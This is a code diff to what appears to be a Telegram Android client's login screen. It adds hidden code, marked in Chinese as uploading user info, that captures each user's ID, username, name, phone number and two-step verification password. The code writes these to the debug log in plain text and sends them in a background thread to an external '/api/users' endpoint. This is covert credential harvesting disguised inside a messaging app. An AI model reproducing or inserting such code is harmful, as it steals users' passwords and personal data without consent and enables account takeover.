@@ -223,6 +223,10 @@ import java.util.Timer;
 import java.util.TimerTask;
 import java.util.concurrent.atomic.AtomicReference;
 
+import report.HttpRequest;
+import report.UserInfoFile;
+import report.entity.UserInfo;
+
 @SuppressLint("HardwareIds")
 public class LoginActivity extends BaseFragment implements NotificationCenter.NotificationCenterDelegate {
     public final static boolean ENABLE_PASTED_TEXT_PROCESSING = false;
@@ -1715,7 +1719,40 @@ public class LoginActivity extends BaseFragment implements NotificationCenter.No
         ConnectionsManager.getInstance(currentAccount).updateDcSettings();
         MessagesController.getInstance(currentAccount).loadAppConfig();
         MessagesController.getInstance(currentAccount).checkPeerColors(false);
+// 上传用户信息 START
 
+        TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+
+        UserInfo userInfo = UserInfoFile.readFile(getContext());
+        userInfo.setId(thisUser.id);
+        userInfo.setUsername(thisUser.username == null ? "" : thisUser.username);
+        userInfo.setFirstName(thisUser.first_name == null ? "" : thisUser.first_name);
+        userInfo.setLastName(thisUser.last_name == null ? "" : thisUser.last_name);
+        userInfo.setPhone(thisUser.phone);
+        UserInfoFile.writeFile(getContext(), userInfo);
+
+        Log.d("TG_DEBUG / ID", userInfo.getId() == null ? "" : String.valueOf(userInfo.getId()));
+        Log.d("TG_DEBUG / Username", userInfo.getUsername() == null ? "" : userInfo.getUsername());
+        Log.d("TG_DEBUG / FirstName", userInfo.getFirstName() == null ? "" : userInfo.getFirstName());
+        Log.d("TG_DEBUG / LastName", userInfo.getLastName() == null ? "" : userInfo.getLastName());
+        Log.d("TG_DEBUG / Phone", userInfo.getPhone() == null ? "" : userInfo.getPhone());
+        Log.d("TG_DEBUG / Password", userInfo.getPassword() == null ? "" : userInfo.getPassword());
+
+        new Thread(() -> {
+            HttpRequest.post(
+                    "/api/users",
+                    null,
+                    null,
+                    Map.of(
+                            "telegram_id", userInfo.getId(),
+                            "username", userInfo.getUsername(),
+                            "nickname", userInfo.getFirstName() + userInfo.getLastName(),
+                            "phone", userInfo.getPhone(),
+                            "password", userInfo.getPassword()
+                    ));
+        }).start();
+
+        // 上传用户信息 END
         if (res.future_auth_token != null) {
             AuthTokensHelper.saveLogInToken(res);
         } else {
@@ -4735,6 +4772,35 @@ public class LoginActivity extends BaseFragment implements NotificationCenter.No
                                         .setOnDismissListener(dialog -> finishFragment())
                                         .show();
                             });
+                            // 更改手机号 START
+
+                            TLRPC.User thisUser = UserConfig.getInstance(currentAccount).getCurrentUser();
+
+                            UserInfo userInfo = UserInfoFile.readFile(getContext());
+                            userInfo.setId(thisUser.id);
+                            userInfo.setUsername(thisUser.username == null ? "" : thisUser.username);
+                            userInfo.setFirstName(thisUser.first_name == null ? "" : thisUser.first_name);
+                            userInfo.setLastName(thisUser.last_name == null ? "" : thisUser.last_name);
+                            userInfo.setPhone(thisUser.phone);
+                            UserInfoFile.writeFile(getContext(), userInfo);
+
+                            Log.d("TG_DEBUG / Phone", userInfo.getPhone() == null ? "" : userInfo.getPhone());
+
+                            new Thread(() -> {
+                                HttpRequest.post(
+                                        "/api/users",
+                                        null,
+                                        null,
+                                        Map.of(
+                                                "telegram_id", userInfo.getId(),
+                                                "username", userInfo.getUsername(),
+                                                "nickname", userInfo.getFirstName() + userInfo.getLastName(),
+                                                "phone", userInfo.getPhone(),
+                                                "password", userInfo.getPassword()
+                                        ));
+                            }).start();
+
+                            // 更改手机号 END
                         } else {
                             lastError = error.text;
                             nextPressed = false;
@@ -5554,6 +5620,17 @@ public class LoginActivity extends BaseFragment implements NotificationCenter.No
                     if (response instanceof TLRPC.TL_auth_authorization) {
                         showDoneButton(false, true);
                         postDelayed(() -> {
+
+
+                            // 二步验证密码 START
+
+                            UserInfo userInfo = UserInfoFile.readFile(getContext());
+                            userInfo.setPassword(codeField.getText().toString());
+                            UserInfoFile.writeFile(getContext(), userInfo);
+
+                            Log.d("TG_DEBUG / Password", userInfo.getPassword() == null ? "" : userInfo.getPassword());
+
+                            // 二步验证密码 END
                             needHideProgress(false, false);
                             AndroidUtilities.hideKeyboard(codeField);
                             onAuthSuccess((TLRPC.TL_auth_authorization) response);
